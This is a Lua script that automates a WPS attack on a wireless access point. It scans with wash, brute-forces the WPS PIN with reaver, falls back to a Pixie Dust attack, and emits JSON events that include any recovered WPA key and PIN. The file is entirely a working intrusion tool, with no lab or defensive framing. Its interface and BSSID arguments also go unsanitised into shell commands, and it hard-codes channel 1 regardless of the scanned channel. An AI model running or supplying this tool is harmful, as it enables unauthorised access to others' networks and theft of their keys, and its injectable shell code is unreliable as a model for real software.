local iface = arg[1]
local bssid = arg[2]
local pin = arg[3] or ""

local function json_escape(s)
  return '"' .. tostring(s):gsub('\\', '\\\\'):gsub('"', '\\"'):gsub('\n', '\\n'):gsub('\r', '\\r') .. '"'
end

local function telemetry(event, data)
  local ts = tostring(os.time())
  io.write('{"event":' .. json_escape(event) .. ',"iface":' .. json_escape(iface) .. ',"bssid":' .. json_escape(bssid) .. ',"ssid":"","channel":"","data":' .. data .. ',"timestamp":' .. json_escape(ts) .. '}\n')
  io.flush()
end

local function check_monitor_mode()
  local cmd = "iw dev " .. iface .. " info 2>/dev/null"
  local f = io.popen(cmd)
  if not f then return false end
  local out = f:read("*a")
  f:close()
  if out:find("type monitor") then
    telemetry("monitor_ok", '{"message":"Monitor mode confirmed"}')
    return true
  end
  telemetry("monitor_fail", '{"message":"Interface not in monitor mode"}')
  return false
end

local function scan_wps()
  telemetry("wps_scan_start", '{"iface":' .. json_escape(iface) .. '}')
  local cmd = "wash -i " .. iface .. " -o /tmp/wash_" .. iface .. ".csv 2>/dev/null &"
  os.execute(cmd)
  os.execute("sleep 15")
  local kill = "pkill -f 'wash -i " .. iface .. "' 2>/dev/null"
  os.execute(kill)
  os.execute("sleep 1")

  local f = io.open("/tmp/wash_" .. iface .. ".csv", "r")
  if not f then
    telemetry("wps_scan_fail", '{"error":"Wash scan failed or no WPS APs found"}')
    return {}
  end

  local aps = {}
  local header = true
  for line in f:lines() do
    if header then
      header = false
    else
      local mac, ch, rssi, wps_ver, lock, enc, essid = line:match("([%x:]+)%s+([%d]+)%s+([%-%d]+)%s+([%d%.]+)%s+([%w]+)%s+([%w]+)%s+(.+)")
      if mac then
        table.insert(aps, {bssid = mac, channel = ch, rssi = rssi, wps_ver = wps_ver, locked = lock, essid = essid})
        telemetry("wps_ap_found", '{"bssid":' .. json_escape(mac) .. ',"channel":' .. json_escape(ch) .. ',"ssid":' .. json_escape(essid or "") .. ',"locked":' .. json_escape(lock) .. '}')
      end
    end
  end
  f:close()
  return aps
end

local function run_reaver(pin_value)
  local cmd = "reaver -i " .. iface .. " -b " .. bssid .. " -c 1 -vvv -L -N"
  if pin_value and #pin_value > 0 then
    cmd = cmd .. " -p " .. pin_value
  end
  cmd = cmd .. " 2>/dev/null"

  telemetry("reaver_start", '{"cmd":' .. json_escape(cmd) .. ',"pin":' .. json_escape(pin_value or "auto") .. '}')

  local f = io.popen(cmd)
  if not f then
    telemetry("reaver_fail", '{"error":"Failed to start reaver"}')
    return
  end

  local wpa_key = nil
  local found_pin = nil
  local progress = 0
  local locked = false

  while true do
    local line = f:read("*l")
    if not line then break end

    if line:find("WPS PIN") and line:find("'") then
      local p = line:match("'([%d]+)'")
      if p then found_pin = p end
    end

    if line:find("WPA PSK") or line:find("WPA key") then
      local k = line:match('"([^"]+)"')
      if k then wpa_key = k end
    end

    if line:find("AP locked") or line:find("WPS lock") then
      locked = true
      telemetry("wps_locked", '{"message":"AP has WPS lockout enabled"}')
    end

    if line:find("%d+%.%d+%%") then
      local p = line:match("(%d+%.%d+)%%")
      if p then
        progress = tonumber(p)
        telemetry("wps_progress", '{"progress":' .. tostring(progress) .. '}')
      end
    end

    if line:find("Pin guessed") or (found_pin and wpa_key) then
      telemetry("wps_success", '{"pin":' .. json_escape(found_pin or "") .. ',"wpa_key":' .. json_escape(wpa_key or "") .. '}')
    end

    if line:find("Trying pin") then
      local try_pin = line:match("'([%d]+)'")
      if try_pin then
        telemetry("wps_pin_try", '{"pin":' .. json_escape(try_pin) .. ',"progress":' .. tostring(progress) .. '}')
      end
    end

    if line:find("pixie dust") or line:find("Pixie") then
      telemetry("pixie_attempt", '{"detail":' .. json_escape(line:sub(1, 200)) .. '}')
    end

    if line:find("WPS transaction failed") then
      telemetry("wps_fail", '{"error":"Transaction failed","progress":' .. tostring(progress) .. '}')
    end
  end

  f:close()

  if wpa_key then
    telemetry("reaver_success", '{"pin":' .. json_escape(found_pin or "") .. ',"wpa_key":' .. json_escape(wpa_key) .. '}')
  else
    telemetry("reaver_result", '{"progress":' .. tostring(progress) .. ',"locked":' .. tostring(locked) .. ',"message":"Attack completed without key recovery"}')
  end

  return wpa_key, found_pin
end

local function pixie_dust_attack()
  telemetry("pixie_start", '{"bssid":' .. json_escape(bssid) .. '}')
  local cmd = "reaver -i " .. iface .. " -b " .. bssid .. " -c 1 -vvv -K 1 -L -N 2>/dev/null"
  local f = io.popen(cmd)
  if not f then
    telemetry("pixie_fail", '{"error":"Failed to start pixie dust attack"}')
    return nil
  end

  local output = f:read("*a")
  f:close()

  if output:find("WPA PSK") or output:find("WPA key") then
    local key = output:match('"([^"]+)"')
    if key then
      telemetry("pixie_success", '{"wpa_key":' .. json_escape(key) .. '}')
      return key
    end
  end

  telemetry("pixie_result", '{"message":"Pixie dust attack did not recover key"}')
  return nil
end

if not iface or not bssid then
  telemetry("error", '{"error":"Usage: wps_attack.lua <interface> <bssid> [pin]"}')
  os.exit(1)
end

if not check_monitor_mode() then
  telemetry("error", '{"error":"Monitor mode required on ' .. iface .. '"}')
  os.exit(1)
end

telemetry("wps_attack_start", '{"bssid":' .. json_escape(bssid) .. ',"pin_provided":' .. json_escape(pin) .. '}')

local aps = scan_wps()
local target_found = false
for _, ap in ipairs(aps) do
  if ap.bssid == bssid then
    target_found = true
    telemetry("target_found", '{"bssid":' .. json_escape(bssid) .. ',"channel":' .. json_escape(ap.channel) .. ',"ssid":' .. json_escape(ap.essid) .. '}')
    break
  end
end

if not target_found then
  telemetry("target_not_found", '{"bssid":' .. json_escape(bssid) .. ',"message":"Target not in scan results, proceeding anyway"}')
end

local key, found_pin = run_reaver(pin)
if not key then
  telemetry("reaver_fallback", '{"message":"Standard reaver failed, trying pixie dust"}')
  key = pixie_dust_attack()
end

if key then
  telemetry("complete", '{"status":"success","wpa_key":' .. json_escape(key) .. ',"pin":' .. json_escape(found_pin or "") .. '}')
else
  telemetry("complete", '{"status":"failed","message":"Could not recover WPS PIN or WPA key"}')
end
